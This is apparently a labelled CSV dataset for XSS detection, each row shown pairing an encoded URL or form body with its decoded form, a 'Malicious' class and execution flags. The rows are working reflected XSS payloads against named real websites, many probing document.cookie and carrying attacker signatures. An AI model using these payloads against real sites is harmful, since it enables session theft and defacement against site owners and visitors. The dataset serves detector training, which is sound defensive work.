Payloads,Class,decoded,executed,parser_changed
http://www.wanajob.com/offres_emplois.php?search=%%3ciframe%20name=''%20src='javascript:alert(1118)'<br>%20scrolling='yes'%20height='220'%20width='180'%20frameborder='yes'%3e%3c/iframe%3e%3cmarquee%3e%3ch<br>1%3exss%20by%20zeryus%3c/h1%3e%3c/marquee%3e,Malicious,http://www.wanajob.com/offres_emplois.php?search=%<iframe name='' src='javascript:alert(1118)' scrolling='yes' height='220' width='180' frameborder='yes'></iframe><marquee><h1>xss by zeryus</h1></marquee>,True,True
http://ysht.tk/2/html/index_done.php?url=&lt;script&gt;alert(1);&lt;/script&gt;&amp;short_url=&lt;script&gt;alert(1);&lt;/scr<br>ipt&gt;,Malicious,http://ysht.tk/2/html/index_done.php?url=<script>alert(1);</script>&short_url=<script>alert(1);</script>,True,True
http://w1.military-mayhem.com/registerver.php?ref=&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,http://w1.military-mayhem.com/registerver.php?ref=><script>alert(1);</script>,True,True
http://www.koubei.com/common/login.html?city=2595--%3e%3cimg/src/onerror=alert(/xss/)%3e&amp;forward_url<br>=,Malicious,http://www.koubei.com/common/login.html?city=2595--><img/src/onerror=alert(/xss/)>&forward_url=,True,True
http://www.kupikartiny.ru/purchase.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.kupikartiny.ru/purchase.php?id=""><script>alert(document.cookie)</script>",True,True
"http://fi.advertising.com/searchresults.php?keyword=extensive""><script>alert(document.cookie)</script>",Malicious,"http://fi.advertising.com/searchresults.php?keyword=extensive""><script>alert(document.cookie)</script>",True,True
http://www.sevillafc.es/_www/temporada.php?op=cro&quot;&gt;&lt;script&gt;alert(/fenerbahce/)&lt;/script&gt;&amp;id=2609&quot;&gt;&lt;sc<br>ript&gt;alert(/fenerbahce/)&lt;/script&gt;,Malicious,"http://www.sevillafc.es/_www/temporada.php?op=cro""><script>alert(/fenerbahce/)</script>&id=2609""><script>alert(/fenerbahce/)</script>",True,True
http://tr.cx/directory/directory.tr?categoryid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://tr.cx/directory/directory.tr?categoryid=""><script>alert(document.cookie)</script>",True,True
http://www.horde.org/download/app/?app=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://www.horde.org/download/app/?app=<script>alert(document.cookie)</script>,True,True
http://biz.mainone.com/productflat/productsearch.aspx?companyid=400088914&amp;showtype=w&amp;key=&quot;&gt;&lt;/form&gt;&lt;s<br>cript&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;,Malicious,"http://biz.mainone.com/productflat/productsearch.aspx?companyid=400088914&showtype=w&key=""></form><script>alert(""xss"")</script><",True,True
http://www.ddindia.gov.in/ddindiachannel/kendrahome.aspx?k=<script>alert(document.cookie)</script>,Malicious,http://www.ddindia.gov.in/ddindiachannel/kendrahome.aspx?k=<script>alert(document.cookie)</script>,True,True
https://www.ippc.int/ipp/fr/default_fr.jsp?language=fr%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3<br>c/script%3e,Malicious,"https://www.ippc.int/ipp/fr/default_fr.jsp?language=fr'""></title><script>alert(1337)</script>",True,True
http://www.steria-psf.lu/index.php?mact=search%2ccntnt01%2cdosearch%2c0&cntnt01returnid=239&cntnt01searchinput=%22%2f%3e%3cscript%3ealert%281%29%3b%3c%2fscript%3e&x=0&y=0,Malicious,"http://www.steria-psf.lu/index.php?mact=search,cntnt01,dosearch,0&cntnt01returnid=239&cntnt01searchinput=""/><script>alert(1);</script>&x=0&y=0",True,True
http://www.sonybmg.it/ricerca/ricerca_risultati.php?st=artista&amp;ss=%22%3e%3cscript%3ealert(document.c<br>ookie);%3c/script%3e,Malicious,"http://www.sonybmg.it/ricerca/ricerca_risultati.php?st=artista&ss=""><script>alert(document.cookie);</script>",True,True
http://info.kopp-verlag.de/suche.html;msg=&lt;script&gt;alert(&quot;xssbydt&quot;)&lt;/script&gt;,Malicious,"http://info.kopp-verlag.de/suche.html;msg=<script>alert(""xssbydt"")</script>",True,True
https://hotels.qantas.com.au/readyrooms/popups/emailafriend.jsp?site=qantas&amp;code=4190conraool&amp;hoteli<br>d=4190conraool&amp;city=ool%22/%3e%3cscript%3ealert%281%29;%3c/script%3e,Malicious,"https://hotels.qantas.com.au/readyrooms/popups/emailafriend.jsp?site=qantas&code=4190conraool&hotelid=4190conraool&city=ool""/><script>alert(1);</script>",True,True
http://blogs.skynet.be/index.html?l1=communication&amp;l2=blogs&amp;l3=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;t<br>urkhackeriz.com&lt;/h1&gt;,Malicious,"http://blogs.skynet.be/index.html?l1=communication&l2=blogs&l3=""><script>alert('trex')</script><h1>turkhackeriz.com</h1>",True,True
http://www.telonu.com/k10search/entity?etype=201&amp;ekeyword=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;elocation<br>=&amp;op=search&amp;form_id=k10search_entity_form,Malicious,"http://www.telonu.com/k10search/entity?etype=201&ekeyword=""></a><script>alert(1);</script>&elocation=&op=search&form_id=k10search_entity_form",True,True
http://haber.turkmania.com/kategoriler.php?kid=4&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious,"http://haber.turkmania.com/kategoriler.php?kid=4</textarea>'""><script>alert(document.cookie)</script>",True,True
http://gvtags.berlios.de/cgi-bin/gvtagswiki.pl?action=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://gvtags.berlios.de/cgi-bin/gvtagswiki.pl?action=""><script>alert(""maxwel"")</script>",True,True
http://www.ausport.gov.au/site_tools/site_search?query=%27%22%3cscript%3ealert%28%27xss%27%29%3b%3c%<br>2fscript%3e&amp;collection=asc&amp;form=simplefragment,Malicious,"http://www.ausport.gov.au/site_tools/site_search?query='""<script>alert('xss');</script>&collection=asc&form=simplefragment",True,True
username=%3cscript%3ealert%28%27hi%27%29%3b%3c%2fscript%3e&email=hello%40slopsbox.com&is_username=on &submit=submit,Malicious,username=<script>alert('hi');</script>&email=hello@slopsbox.com&is_username=on &submit=submit,True,True
http://www.yaronet.com/forum.php?s=39%27%22%3e%3cimg%20src=k.png%20onerror=alert(/xss/.source)%20/%3<br>e,Malicious,"http://www.yaronet.com/forum.php?s=39'""><img src=k.png onerror=alert(/xss/.source) />",True,True
http://www.net.hr/search_rd.jsp?ct=archive&amp;type=search&amp;artperpage=15&amp;q=%22%3e%3cscript%3ealert%281%2<br>9%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%28%27<br>kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%28101<br>11%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1<br>%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%<br>3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;suffix=&amp;site=&amp;pagenum=null&amp;action=search,Malicious,"http://www.net.hr/search_rd.jsp?ct=archive&type=search&artperpage=15&q=""><script>alert(1)</script></textarea><script>alert(""kaksii_was_here"")<script>alert('kaksii_was_here');alert(1)</script>""</html><html><script>alert(10111)</script><div align=center> <font size=4><textarea name=1 cols=100000 rows=10000 id=1>kaksii was here</textarea></font></div><noscript><plaintext>&suffix=&site=&pagenum=null&action=search",True,True
http://www.hexar.net/viewfile.php?/&lt;/title&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://www.hexar.net/viewfile.php?/</title><script>alert(document.cookie);</script>,True,True
http://www.petal-shoppe.com/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.petal-shoppe.com/gallery/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.video2mp3.net/afterdownload.php?title=&lt;script&gt;alert(0)&lt;/script&gt;,Malicious,http://www.video2mp3.net/afterdownload.php?title=<script>alert(0)</script>,True,True
http://www.akalitesexshop.com/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/<br>script%3e,Malicious,"http://www.akalitesexshop.com/odeme.asp?defurunid=""><script>alert(""document.cookie"")</script>",True,True
http://cafenews.allblog.net/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%<br>69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%3<br>1%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35<br>%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious,"http://cafenews.allblog.net/index.php?action=index&setdate=200703&setday=21"">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
&page=1",True,True
http://activepaper.olivesoftware.com/default/welcome.asp?skin=registerd&amp;qs=&quot;&gt;&lt;script&gt;alert(1);&lt;/scri<br>pt&gt;,Malicious,"http://activepaper.olivesoftware.com/default/welcome.asp?skin=registerd&qs=""><script>alert(1);</script>",True,True
http://www.ldc.upenn.edu/search/index.php?q=%22%22%3e%3e%3c%3cimg+%22%22%22%3e%3cscript%3ealert%28%2<br>fxss%2f%29%3c%2fscript%3e%27%3c%2fscript%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e,Malicious,"http://www.ldc.upenn.edu/search/index.php?q="""">><<img """"""><script>alert(/xss/)</script>'</script><script>alert(document.domain)</script>",True,True
http://www.activeculture.info/events.asp?chkcategory=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.activeculture.info/events.asp?chkcategory=""><script>alert(""maxwel"")</script>",True,True
http://www.icr.ro/bucuresti/search/?search_check=1&amp;search_text=%3cscript%3ealert(1)%3c%2fscript%3e++<br>&amp;go_search=ok,Malicious,http://www.icr.ro/bucuresti/search/?search_check=1&search_text=<script>alert(1)</script>  &go_search=ok,True,True
http://www.tufanbeyli.org/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=&quot;&gt;&lt;script&gt;alert(&quot;xssedby<br>cicosz&quot;)&lt;/script&gt;,Malicious,"http://www.tufanbeyli.org/members.asp?mode=search&m_name=g&initial=1&method=""><script>alert(""xssedbycicosz"")</script>",True,True
http://www.lottejansen.com/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.lottejansen.com/gallery/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://fits.gsfc.nasa.gov/cgi-bin/browse?file=&quot;&gt;&lt;script&gt;alert('netjackal')&lt;/script&gt;,Malicious,"http://fits.gsfc.nasa.gov/cgi-bin/browse?file=""><script>alert('netjackal')</script>",True,True
http://www.lichtzeichnungen.com/phpinfo.php?a[]=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious,http://www.lichtzeichnungen.com/phpinfo.php?a[]=<script>alert(/xss/);</script>,True,True
http://www.eanservice.com/sitemgr.php?env=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.eanservice.com/sitemgr.php?env=""><script>alert(""maxwel"")</script>",True,True
http://www.ssro.on.ca/about/careers-details-e.cfm?id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.ssro.on.ca/about/careers-details-e.cfm?id=""><script>alert(""maxwel"")</script>",True,True
http://www.inndir.com/program.php?id=7400%22%3e%3ch1%3eby%20st@rext%3c/h1%3e%3cscript%3ealert(docume<br>nt.cookie)%3c/script%3e,Malicious,"http://www.inndir.com/program.php?id=7400""><h1>by st@rext</h1><script>alert(document.cookie)</script>",True,True
http://ms153.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms153.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.billevans.org/bbs/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious,"http://www.billevans.org/bbs/philboard_search.asp?searchterms=""><script>alert(document.cookie)</script><h1>www.raptr.us.tc</h1>",True,True
http://www.bobtheque.com/?ttl=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3<br>exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;btnfind=chercher&amp;module=nflm_lst&amp;flttpe=0,Malicious,http://www.bobtheque.com/?ttl=<script>alert(/zeryus/)</script><marquee><h1>xss by zeryus </h1></marquee>&btnfind=chercher&module=nflm_lst&flttpe=0,True,True
http://www.behnkes.com/products.php?openparent=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.behnkes.com/products.php?openparent=""><script>alert(document.cookie)</script>",True,True
http://www.akahl.de/index.php?hid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.akahl.de/index.php?hid=""><script>alert(""maxwel"")</script>",True,True
http://www.odevarsivi.com/dosyaara.asp?islem=ara&amp;nerden=0&amp;kelime=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&lt;h1&gt;by st@rext&lt;/h1&gt;,Malicious,"http://www.odevarsivi.com/dosyaara.asp?islem=ara&nerden=0&kelime=""><script>alert(document.cookie)</script><h1>by st@rext</h1>",True,True
http://www.pcworld.be/fr/fiches/news/security/een-virus-voor-mac-os-x.cfm?comments=&quot;&gt;&lt;script&gt;alert(&quot;<br>maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.pcworld.be/fr/fiches/news/security/een-virus-voor-mac-os-x.cfm?comments=""><script>alert(""maxwel"")</script>",True,True
https://www.earthlyendeavours.com/signup.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"https://www.earthlyendeavours.com/signup.php?ref=""><script>alert(document.cookie);</script>",True,True
http://nyats.com/dia/search.cgi?word='%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%22)%<br>3c/script%3e&amp;prm=and&amp;submit.x=0&amp;submit.y=0,Malicious,"http://nyats.com/dia/search.cgi?word='>"">'><script>alert(""xss by kusomiso.com"")</script>&prm=and&submit.x=0&submit.y=0",True,True
"</ foo=""><script>javascript:alert(1)</script>"">",Malicious,"</ foo=""><script>javascript:alert(1)</script>"">",True,True
http://touch.afisha.mail.ru/%22%3e%3cscript%3ealert%28%22xss_by_c37hun%22%29%3c/script%3e,Malicious,"http://touch.afisha.mail.ru/""><script>alert(""xss_by_c37hun"")</script>",True,True
http://www.newsherald.com/search/?q=&lt;script&gt;alert(/xss devek/)&lt;%2fscript&gt;,Malicious,http://www.newsherald.com/search/?q=<script>alert(/xss devek/)</script>,True,True
http://www.123people.com/s/%22'%3cimg+src=.+onerror=alert('xssed_by_pierre_gardenat');+%3e,Malicious,"http://www.123people.com/s/""'<img src=. onerror=alert('xssed_by_pierre_gardenat'); >",True,True
http://www.gamer.hr/recenzije/civ4beyondsword.php?id=%27%22%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious,"http://www.gamer.hr/recenzije/civ4beyondsword.php?id='""><script>alert(1337)</script>",True,True
http://www.explorebaltimorecounty.com/search/?s='&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;action=go,Malicious,"http://www.explorebaltimorecounty.com/search/?s='""><script>alert(document.cookie)</script>&action=go",True,True
http://www.sakaeoservicelink.go.th/content.asp?contenttype=%3cscript%3ealert(document.cookie)%3c/scr<br>ipt%3e,Malicious,http://www.sakaeoservicelink.go.th/content.asp?contenttype=<script>alert(document.cookie)</script>,True,True
http://www.gouv.mc/devwww/wwwnew.nsf/1909!/x6gb?opendocument&amp;%22%3e%3cscript%3ealert(123)%3c/script%<br>3e,Malicious,"http://www.gouv.mc/devwww/wwwnew.nsf/1909!/x6gb?opendocument&""><script>alert(123)</script>",True,True
https://registration.myway.com/primary_login.jsp?regarea=%22%3e%3cscript%3ealert%28document.cookie%2<br>9%3c/script%3e,Malicious,"https://registration.myway.com/primary_login.jsp?regarea=""><script>alert(document.cookie)</script>",True,True
http://www.roamsecure.net/content.php?contentid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.roamsecure.net/content.php?contentid=""><script>alert(document.cookie)</script>",True,True
http://www.cabs.org/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.cabs.org/gallery/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.yuchooz.com/?hl=en&amp;q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs<br>&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.yuchooz.com/?hl=en&q=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
"http://www.whatsapp.com/payments/pay.php?phone=<script>alert(""edgard was here..."")</script>",Malicious,"http://www.whatsapp.com/payments/pay.php?phone=<script>alert(""edgard was here..."")</script>",True,True
modo=entrar&login=mathews&pwd=6u1ad5%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e&remember=on&b1=entrar,Malicious,"modo=entrar&login=mathews&pwd=6u1ad5<script>alert(""paros"");</script>&remember=on&b1=entrar",True,True
http://sexinthecitiestour.com/buynow.php?id=550%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://sexinthecitiestour.com/buynow.php?id=550""><script>alert(document.cookie)</script>",True,True
https://www.newsvine.com/_nv/accounts/accountsettingslogin?tab=newsvine&amp;item=emailalerts&amp;affiliate=%<br>22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;redirect=https%3a%2f%2fwww.newsvine.com%2<br>f_nv%2faccounts%2fnewsvine%2femailalerts%3faffiliate%3d%2522%253e%253cscript%253ealert%2528document.<br>cookie%2529%253c%252fscript%253e,Malicious,"https://www.newsvine.com/_nv/accounts/accountsettingslogin?tab=newsvine&item=emailalerts&affiliate=""><script>alert(document.cookie)</script>&redirect=https://www.newsvine.com/_nv/accounts/newsvine/emailalerts?affiliate=""><script>alert(document.cookie)</script>",True,True
http://www.kdh.gov.tr/index.php?a=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.kdh.gov.tr/index.php?a=""><script>alert(document.cookie)</script>",True,True
http://euronews.com/link.php?url=----://google.com&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://euronews.com/link.php?url=----://google.com""></iframe><script>alert(1);</script>",True,True
http://www.cadoons-boutique.com/pages/?all=recherche&amp;idl=21/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;x=17&amp;y=8,Malicious,"http://www.cadoons-boutique.com/pages/?all=recherche&idl=21/""><script>alert('xss byatm0n3r')</script>&x=17&y=8",True,True
http://davao.da.gov.ph/mrdp/phpinfo.php?a[]=%3e%3cscript%3ealert(/kabus/);%3c/script%3e,Malicious,http://davao.da.gov.ph/mrdp/phpinfo.php?a[]=><script>alert(/kabus/);</script>,True,True
http://www.cs.chalmers.se/cs/research/functional/multilib/haskellcgi/show-haskell.cgi?file=../haskel<br>lcgi/show-haskell.cgi&amp;title=%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3edocument.write<br>('norehem%20was%20here')%3c/script%3e%3cmarquee%3e%3ch1%3enorehem%20was%20here%3c/h1%3e%3c/marquee%3<br>e%3cimg%20src=%22http://mexico.udg.mx/politica/simbolospatrios/imagen/bandera2.gif%22%3e%3cscript%3e<br>alert%20('norehem%20was%20here')%3c/script%3e%3c,Malicious,"http://www.cs.chalmers.se/cs/research/functional/multilib/haskellcgi/show-haskell.cgi?file=../haskellcgi/show-haskell.cgi&title=><title>norehem was here</title><script>document.write('norehem was here')</script><marquee><h1>norehem was here</h1></marquee><img src=""http://mexico.udg.mx/politica/simbolospatrios/imagen/bandera2.gif""><script>alert ('norehem was here')</script><",True,True
